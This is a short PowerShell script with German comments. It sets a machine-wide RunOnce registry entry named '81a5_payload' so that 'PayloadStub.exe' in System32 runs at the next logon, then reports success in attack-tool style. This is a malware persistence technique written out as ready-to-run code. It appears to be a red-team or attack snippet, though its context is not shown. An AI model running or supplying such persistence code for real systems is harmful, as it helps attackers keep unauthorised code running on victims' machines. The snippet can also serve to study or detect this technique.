# Setzt RunOnce-Eintrag für PayloadStub.exe
$path = "C:\Windows\System32\PayloadStub.exe"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "81a5_payload" -Value $path
Write-Host "[+] RunOnce-Eintrag gesetzt: $path"

